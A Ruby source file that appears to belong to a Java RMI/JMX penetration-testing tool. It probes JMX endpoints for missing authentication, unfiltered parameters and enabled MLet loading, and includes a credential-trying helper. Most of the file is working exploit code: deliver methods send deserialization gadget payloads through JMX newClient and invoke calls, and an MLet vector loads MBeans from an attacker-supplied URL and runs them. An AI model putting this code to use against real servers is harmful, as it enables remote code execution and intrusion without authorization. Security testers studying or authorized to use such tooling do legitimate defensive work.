#!/usr/bin/env ruby
require_relative 'classfile'
require_relative 'serialize'
require_relative 'jrmp'
require_relative 'rmi'
require_relative 'prober'
require_relative 'payloads/probe'
require_relative 'payloads/dos'
require_relative 'payloads/jrmp'

module Java
  module JMX
    class JMXInvokeDeserVector < Java::RMI::RMICallDeserVector
      # this should take the RMIServer information,
      # actual connection is made here
      def	initialize(host, port, objId, uid: nil, ssl: false, creds: nil, ctx: nil, name: nil, method: nil)
        super(host, port, objId, uid: uid, ssl: ssl, ctx: ctx)
        @creds = creds
        @name = name
        @method = method
      end

      def id
        ['deser', @host, @port, @ctx.gadgets]
      end

      def prio
        50
      end

      def deliver(payl)
        client = Java::JRMP::JRMPClient.new(@host, @port, @ctx.reg, ssl: @ssl)
        # newClient
        jmxref = Java::JRMP.unwrap_ref(client.sendLegacy(@objId, -1, -1_089_742_558_549_201_240, [@creds], uid: @uid))
        args = [
          Java::Serialize::JavaObject.new('Ljavax/management/ObjectName;', @name),
          @method,
          Java::JRMP.make_marshalledobject(
            Java::Serialize::JavaArray.new('Ljava/lang/Object;', [payl]), ctx.reg
          ),
          Java::Serialize::JavaArray.new('Ljava/lang/String;', ['java.lang.String']),
          nil
        ]

        begin
          client.sendLegacy(jmxref['objid'], -1, 1_434_350_937_885_235_744, args, uid: jmxref['uid'])
        rescue Java::JRMP::JRMPError => e
          root = Java::JRMP.unwrap_exception(e.ex)
          type = root[0][0]
          if type == 'java.lang.IllegalArgumentException'
            return true
          else
            raise
          end
        end
      end

      def inspect
        format('JMX invoke to %s:%d method %s::%s: Deserialization %s', @host, @port, @name, @method, @ctx.gadgets.to_a.to_s)
      end
    end

    class JMXCallDeserVector < Java::RMI::RMICallDeserVector
      # this should take the RMIServer information,
      # actual connection is made here
      def	initialize(host, port, objId, uid: nil, methodId: -1, methodHash: 0, ssl: false, baseargs: [nil], argidx: 0, creds: nil, ctx: nil)
        super(host, port, objId, uid: uid, methodHash: methodHash, ssl: ssl, baseargs: baseargs, argidx: argidx, ctx: ctx)
        @creds = creds
      end

      def id
        ['deser', @host, @port, @ctx.gadgets]
      end

      def prio
        20
      end

      def deliver(payl)
        args = @baseargs.dup
        args[@argidx] = payl

        client = Java::JRMP::JRMPClient.new(@host, @port, @ctx.reg, ssl: @ssl)
        # newClient
        jmxref = Java::JRMP.unwrap_ref(client.sendLegacy(@objId, -1, -1_089_742_558_549_201_240, [@creds], uid: @uid))

        client = Java::JRMP::JRMPClient.new(@host, @port, @ctx.reg, ssl: @ssl)

        begin
          client.sendLegacy(jmxref['objid'], -1, @methodHash, args, uid: jmxref['uid'])
        rescue Java::JRMP::JRMPError => e
          root = Java::JRMP.unwrap_exception(e.ex)
          type = root[0][0]
          if type == 'java.lang.IllegalArgumentException'
            return true
          else
            raise
          end
        end
      end

      def inspect
        format('JMX call to %s:%d method %d: Deserialization %s', @host, @port, @methodHash, @ctx.gadgets.to_a.to_s)
      end
    end

    class JMXMLetVector < Java::RMI::RMICallArgumentVector
      def	initialize(host, port, objId, uid: nil, ssl: false, creds: nil, name: nil, reg: nil)
        super(host, port, objId, uid: uid, ssl: ssl)
        @creds = creds
        @name = name
        @reg = reg
      end

      def id
        ['mlet', @host, @port]
      end

      def prio
        -50
      end

      def deliver(payl)
        client = Java::JRMP::JRMPClient.new(@host, @port, @reg, ssl: @ssl)
        # newClient
        jmxref = Java::JRMP.unwrap_ref(client.sendLegacy(@objId, -1, -1_089_742_558_549_201_240, [@creds], uid: @uid))
        args = ['javax.management.loading.MLet', @name, nil]

        # createMBean(Ljava/lang/String;Ljavax/management/ObjectName;Ljavax/security/auth/Subject;)Ljavax/management/ObjectInstance; 2510753813974665446
        begin
          client = Java::JRMP::JRMPClient.new(@host, @port, @reg, ssl: @ssl)
          client.sendLegacy(jmxref['objid'], -1, 2_510_753_813_974_665_446, args, uid: jmxref['uid'])
          info 'Created MLet bean instance'
        rescue Java::JRMP::JRMPError => e
          root = Java::JRMP.unwrap_exception(e.ex)
          raise if root[0][0] != 'javax.management.InstanceAlreadyExistsException'
          info 'MLet bean instance already exists'
        rescue	Exception => e
          error 'Failed to create MLet instance: ' + e.to_s
        end

        # invoke(Ljavax/management/ObjectName;Ljava/lang/String;Ljava/rmi/MarshalledObject;[Ljava/lang/String;Ljavax/security/auth/Subject;)Ljava/lang/Object; 1434350937885235744

        args = [@name, 'getMBeansFromURL',
                Java::JRMP.make_marshalledobject(
                  Java::Serialize::JavaArray.new('Ljava/lang/Object;',
                                                 [payl]), @reg
                ),
                Java::Serialize::JavaArray.new('Ljava/lang/String;', ['java.lang.String']), nil]

        begin
          client = Java::JRMP::JRMPClient.new(@host, @port, @reg, ssl: @ssl)
          r = client.sendLegacy(jmxref['objid'], -1, 1_434_350_937_885_235_744, args, uid: jmxref['uid'])

          if !r[1].key?('elements') || r[1]['elements'].empty?
            error 'MBean creation seems to have failed, response ' + r.to_s
          end

          on = r[1]['elements'][0][1]['name']
          args = [Java::Serialize::JavaObject.new('Ljavax/management/ObjectName;',
                                                  'name' => on[1]['name']),
                  'run',
                  Java::JRMP.make_marshalledobject(
                    Java::Serialize::JavaArray.new('Ljava/lang/Object;', []), @reg
                  ),
                  Java::Serialize::JavaArray.new('Ljava/lang/String;', []), nil]

          client = Java::JRMP::JRMPClient.new(@host, @port, @reg, ssl: @ssl)
          r = client.sendLegacy(jmxref['objid'], -1, 1_434_350_937_885_235_744, args, uid: jmxref['uid'])

          puts r
        rescue Java::JRMP::JRMPError => e
          root = Java::JRMP.unwrap_exception(e.ex)
          type = root[0][0]
          raise
        rescue	Exception => e
          error 'Failed to create MBean via MLet: ' + e.to_s
          raise
        rescue Timeout::Error
          error 'Timeout waiting for MBean creation'
        end
      end

      def inspect
        format('JMX MLet loading on %s:%d', @host, @port)
      end
    end

    class JMXProber < Java::JRMP::ReferenceProber
      attr_reader :auth

      @@bultins = [
        'java.lang:type=MemoryPool,name=Metaspace',
        'java.lang:type=MemoryPool,name=PS Old Gen',
        'java.lang:type=GarbageCollector,name=PS Scavenge',
        'java.lang:type=MemoryPool,name=PS Eden Space',
        'JMImplementation:type=MBeanServerDelegate',
        'java.lang:type=Runtime',
        'java.lang:type=Threading',
        'java.lang:type=OperatingSystem',
        'java.lang:type=MemoryPool,name=Code Cache',
        'java.nio:type=BufferPool,name=direct',
        'java.lang:type=Compilation',
        'java.lang:type=MemoryManager,name=CodeCacheManager',
        'java.lang:type=MemoryPool,name=Compressed Class Space',
        'java.lang:type=Memory',
        'java.nio:type=BufferPool,name=mapped',
        'java.util.logging:type=Logging',
        'java.lang:type=MemoryPool,name=PS Survivor Space',
        'java.lang:type=ClassLoading',
        'java.lang:type=MemoryManager,name=Metaspace Manager',
        'java.lang:type=GarbageCollector,name=PS MarkSweep',
        'com.sun.management:type=HotSpotDiagnostic',
        'com.sun.management:type=DiagnosticCommand'
      ]

      def initialize(name, ref, reg, connhost, jmxcreds: nil, rc: Java::Config::RunConfig.new)
        super(name, ref, reg, connhost)

        @skip = false
        @jmxconnref = nil
        @needauth = true
        @auth = false
        @jmxcreds = jmxcreds
        @rc = rc
        begin
          @jmxver = send(-1, -8_081_107_751_519_807_347, [])
          info 'JMX Version: ' + @jmxver.strip
        rescue Java::JRMP::JRMPError => e
          root = Java::JRMP.unwrap_exception(e.ex)
          type = root[0][0]
          if name == 'jmxrmi'
            raise
          else
            info 'Appears to be not an JMX service'
            @skip = true
          end
        end
        end

      def test_call(payl, reg, params)
        args = params['args']
        args[params['argidx']] = payl
        send(-1, params['methodhash'], args, customreg: reg)
        rescue Java::JRMP::JRMPError => e
          root = Java::JRMP.unwrap_exception(e.ex)
          type = root[0][0]
          if type == 'java.lang.IllegalArgumentException'
            return
          else
            return type
          end
        end

      def sendClient(methodhash, args, location: nil, customreg: nil)
        return if @jmxconnref.nil?

        reg = @reg
        unless customreg.nil?
          customreg.load('model/rmi.json')
          reg = customreg
        end

        client = Java::JRMP::JRMPClient.new(@host, @port, reg, location: location, ssl: @ssl)
        client.sendLegacy(@jmxconnref['objid'], -1, methodhash, args, uid: @jmxconnref['uid'])
      end

      def run
        vectors = []
        return if @skip

        vectors += run_auth
        return if @jmxconnref.nil?

        begin
          connid = sendClient(-67_907_180_346_059_933, [])
          info 'JMX connection valid, id: ' + connid
        rescue Java::JRMP::JRMPError => e
          root = Java::JRMP.unwrap_exception(e.ex)
          error root.to_s
        end

        vectors += run_param_filter

        vectors += run_mlet if @rc.tryMlet?

        vectors += run_object_enum

        vectors
      end

      def close
        begin
          info 'Trying to close JMX connection'
          sendClient(-4_742_752_445_160_157_748, args, ssl: objssl)
        rescue Exception
        end
        @jmxconnref = nil
      end

      def run_auth
        vectors = []
        filtered = false
        classload = false
        begin
          url = Java::Serialize::JavaObject.new('Ljava/net/URL;', 'protocol' => 'http',
                                                                  'host' => 'test.invalid',
                                                                  'hashCode' => -1)
          o = send(-1, -1_089_742_558_549_201_240, [url])
          info 'JMX does not appear to require authentication'
          unless @rc.tryMlet?
            vuln 'This usually means that MLet loading is allowed'
          end
          vuln 'JMX auth (newClient) does not filter parameters'
          classload = @rc.tryClassload? && Java::JRMP.test_remoteclassloading(@host, @port, @reg, @objid, @uid, -1, -1_089_742_558_549_201_240, ssl: @ssl)
          @jmxconnref = Java::JRMP.unwrap_ref(o)
          @needauth = false
        rescue Java::JRMP::JRMPError => e
          root = Java::JRMP.unwrap_exception(e.ex)
          type = root[0][0]
          if type == 'java.io.InvalidClassException' ||
             (type == 'java.lang.ClassCastException' &&
              root[1]['detailMessage'].start_with?('Unsupported type:'))
            okay 'JMX auth filters parameter types'
            filtered = true
            @needauth = false
          elsif type == 'java.lang.SecurityException'
            vuln 'JMX auth required, but unfiltered parameters'
            classload = @rc.tryClassload? && Java::JRMP.test_remoteclassloading(@host, @port, @reg, @objid, @uid, -1, -1_089_742_558_549_201_240, ssl: @ssl)
            @auth = true
          elsif type == 'java.lang.ClassCastException'
            vuln 'JMX auth (newClient) does not filter parameters'
            classload = @rc.tryClassload? && Java::JRMP.test_remoteclassloading(@host, @port, @reg, @objid, @uid, -1, -1_089_742_558_549_201_240, ssl: @ssl)
          else
            error 'JMX connection failed: ' + type
          end
        end

        if classload
          vectors.push(Java::RMI::RMIClassLoadingVector.new(@host, @port, @objid, uid: @uid,
                                                                                  methodHash: -1_089_742_558_549_201_240,
                                                                                  ssl: @ssl))
        end

        if @rc.tryDeser? && !filtered
          ctx = Java::Prober::BuiltinProbes.new.create_context(@reg, params: {
                                                                 'objid' => @objid,
                                                                 'methodhash' => -1_089_742_558_549_201_240,
                                                                 'argidx' => 0,
                                                                 'args' => [nil]
                                                               })
          strategy = Java::Prober::ExceptionProbeStrategy.new(method(:test_call))
          strategy.init(ctx)

          if ctx.run(strategy)
            vectors.push(Java::RMI::RMICallDeserVector.new(@host, @port, @objid,
                                                           uid: @uid,
                                                           methodHash: -1_089_742_558_549_201_240, ssl: @ssl,
                                                           ctx: ctx))
          end
        end

        if @jmxconnref.nil? && @needauth && @jmxcreds.nil?
          error 'Further checks would require credentials'
        elsif @jmxconnref.nil?
          if !@jmxcreds.nil?
            info 'Trying authenticated JMX connection'
            @auth = true
          else
            info 'Trying unauthenticated JMX connection'
          end
          begin
            o = send(-1, -1_089_742_558_549_201_240, [@jmxcreds])
            @jmxconnref = Java::JRMP.unwrap_ref(o)
            info 'Connection established successfully'
            if !@auth && !@rc.tryMlet?
              vuln 'This usually means that MLet loading is allowed'
            end
          rescue Java::JRMP::JRMPError => e
            root = Java::JRMP.unwrap_exception(e.ex)
            type = root[0][0]
            if type == 'java.lang.SecurityException'
              error 'Invalid Credentials: ' + root[1]['detailMessage']
              @auth = true
            else
              raise
            end
          end
        end
        vectors
      end

      def trylogin(user, pass)
        creds = Java::Serialize::JavaArray.new('Ljava/lang/String;', [user, pass])
        send(-1, -1_089_742_558_549_201_240, [creds])
        return true
        rescue Java::JRMP::JRMPError => e
          root = Java::JRMP.unwrap_exception(e.ex)
          type = root[0][0]
          if type == 'java.lang.SecurityException'
            return false
          else
            raise
          end
        end

      def send_param(payl, reg, params)
        args = params['args']
        args[params['argidx']] = payl
        sendClient(params['methodhash'], args, customreg: reg)
        rescue Java::JRMP::JRMPError => e
          root = Java::JRMP.unwrap_exception(e.ex)
          type = root[0][0]
          if type == 'java.lang.IllegalArgumentException'
            return
          else
            return type
          end
        end

      def run_param_filter
        vectors = []
        filtered = false
        begin
          url = Java::Serialize::JavaObject.new('Ljava/net/URL;', 'protocol' => 'http',
                                                                  'host' => 'test.invalid',
                                                                  'hashCode' => -1)
          sendClient(-2_042_362_057_335_820_635, [url])
          raise 'Should not succeed'
        rescue Java::JRMP::JRMPError => e
          root = Java::JRMP.unwrap_exception(e.ex)
          type = root[0][0]
          if type == 'java.io.InvalidClassException'
            okay 'JMX getMBeanCount has filtering (please provide detail to author)'
            filtered = true
          elsif type == 'java.lang.ClassCastException' ||
                (type == 'java.lang.IllegalArgumentException' &&
                 (root[1]['detailMessage'] == 'argument type mismatch' ||
                  root[1]['detailMessage'].start_with?('java.lang.ClassCastException')))
            vuln 'JMX getMBeanCount does not filter parameters'
          else
            raise
          end
        end

        if @rc.tryClassload? && Java::JRMP.test_remoteclassloading(@host, @port, @reg, @jmxconnref['objid'], @jmxconnref['uid'], -1, -2_042_362_057_335_820_635, ssl: @ssl)

          vectors.push(Java::RMI::RMIClassLoadingVector.new(@host, @port, @jmxconnref['objid'],
                                                            uid: @jmxconnref['uid'],
                                                            methodHash: -2_042_362_057_335_820_635,
                                                            ssl: @ssl))
        end

        return vectors if filtered || !@rc.tryDeser?

        ctx = Java::Prober::BuiltinProbes.new.create_context(@reg, params: {
                                                               'methodhash' => -2_042_362_057_335_820_635,
                                                               'args' => [nil],
                                                               'argidx' => 0
                                                             })
        strategy = Java::Prober::ExceptionProbeStrategy.new(method(:send_param))
        strategy.init(ctx)

        if ctx.run(strategy)
          vectors.push(JMXCallDeserVector.new(@host, @port, @objid, ssl: @ssl,
                                                                    creds: @jmxcreds,
                                                                    ctx: ctx,
                                                                    uid: @uid,
                                                                    methodHash: -2_042_362_057_335_820_635))
        end
        vectors
      end

      def send_invoke(payl, reg, params)
        sendClient(1_434_350_937_885_235_744, [
                     Java::Serialize::JavaObject.new('Ljavax/management/ObjectName;', params['name']),
                     'test',
                     Java::JRMP.make_marshalledobject(
                       Java::Serialize::JavaArray.new('Ljava/lang/Object;', [payl]), reg
                     ),
                     Java::Serialize::JavaArray.new('Ljava/lang/String;', ['java.lang.String']),
                     nil
                   ])
        rescue Java::JRMP::JRMPError => e
          root = Java::JRMP.unwrap_exception(e.ex)
          type = root[0][0]
          if type == 'java.lang.IllegalArgumentException'
            return
          else
            return type
          end
        end

      def run_object_enum
        vectors = []
        objects = []
        begin
          args = [Java::Serialize::JavaObject.new('Ljavax/management/ObjectName;', {}), nil, nil]
          o = sendClient(9_152_567_528_369_059_802, args)
          objects = o[1]['elements']
          info 'Found ' + objects.length.to_s + ' JMX objects, checking for available gadgets...'
        rescue Java::JRMP::JRMPError => e
          root = Java::JRMP.unwrap_exception(e.ex)
          type = root[0][0]
          error 'JMX enumeration failed: ' + type + ' - ' + root[1]['detailMessage']
        end

        # invoke(Ljavax/management/ObjectName;Ljava/lang/String;Ljava/rmi/MarshalledObject;[Ljava/lang/String;Ljavax/security/auth/Subject;)Ljava/lang/Object; 1434350937885235744

        objects.each do |obj|
          on = obj[1]['name']
          # bultin objects should have the system or app classloader that can be
          # reached with other vectors
          next if @@bultins.include?(on)
          begin
            sendClient(1_434_350_937_885_235_744, [
                         Java::Serialize::JavaObject.new('Ljavax/management/ObjectName;', obj[1]),
                         'test',
                         Java::JRMP.make_marshalledobject(
                           Java::Serialize::JavaArray.new('Ljava/lang/Object;', []), @reg
                         ),
                         Java::Serialize::JavaArray.new('Ljava/lang/String;', ['java.lang.String']),
                         nil
                       ])
          rescue Java::JRMP::JRMPError => e
            root = Java::JRMP.unwrap_exception(e.ex)
            type = root[0][0]

            if type != 'javax.management.ReflectionException' && type != 'java.lang.SecurityException'
              if !root[1]['detailMessage'].nil?
                error 'JMX invoke on ' + obj[1]['name'] + ' unexpected error: ' + type + ' - ' + root[1]['detailMessage']
              else
                error 'JMX invoke on ' + obj[1]['name'] + ' unexpected error: ' + type + ' - '
              end
              next
            end
          end

          next unless @rc.tryDeser?

          ctx = Java::Prober::BuiltinProbes.new.create_context(@reg, params: {
                                                                 'name' => obj[1]
                                                               })
          strategy = Java::Prober::ExceptionProbeStrategy.new(method(:send_invoke))
          strategy.init(ctx)

          next unless ctx.run(strategy)
          vectors.push(JMXInvokeDeserVector.new(@host, @port, @objid, ssl: @ssl,
                                                                      creds: @jmxcreds,
                                                                      ctx: ctx,
                                                                      uid: @uid,
                                                                      name: obj[1],
                                                                      method: 'test'))
        end

        vectors
      end

      def run_mlet
        vectors = []
        begin
          info 'Trying to create MLet instance'
          mletname = Java::Serialize::JavaObject.new('Ljavax/management/ObjectName;', 'name' => 'exploit:name=Mlet')
          args = ['javax.management.loading.MLet', mletname, nil]

          # createMBean(Ljava/lang/String;Ljavax/management/ObjectName;Ljavax/security/auth/Subject;)Ljavax/management/ObjectInstance; 2510753813974665446
          begin
            o = sendClient(2_510_753_813_974_665_446, args)
            info 'Created MLet bean instance'
          rescue Java::JRMP::JRMPError => e
            root = Java::JRMP.unwrap_exception(e.ex)
            if root[0][0] != 'javax.management.InstanceAlreadyExistsException'
              raise
            end
            info 'MLet bean instance already exists'
          end

          # invoke(Ljavax/management/ObjectName;Ljava/lang/String;Ljava/rmi/MarshalledObject;[Ljava/lang/String;Ljavax/security/auth/Subject;)Ljava/lang/Object; 1434350937885235744

          args = [mletname, 'getMBeansFromURL',
                  Java::JRMP.make_marshalledobject(
                    Java::Serialize::JavaArray.new('Ljava/lang/Object;',
                                                   ['http://test.invalid/test.mlet']), @reg
                  ),
                  Java::Serialize::JavaArray.new('Ljava/lang/String;', ['java.lang.String']), nil]
          sendClient(1_434_350_937_885_235_744, args)
        rescue Java::JRMP::JRMPError => e
          root = Java::JRMP.unwrap_exception(e.ex)
          type = root[0][0]

          if type == 'java.lang.SecurityException'
            okay 'MLet loading denied'
          elsif type == 'javax.management.MBeanException'
            vuln 'MLet loading enabled: ' + root[1]['detailMessage']

            vectors.push(JMXMLetVector.new(@host, @port, @objid, ssl: @ssl,
                                                                 creds: @jmxcreds,
                                                                 uid: @uid,
                                                                 name: mletname,
                                                                 reg: @reg))
          else
            error 'MLet initalization failed: ' + type + ' - ' + root[1]['detailMessage']
          end
        end
        vectors
      end
    end
  end
end
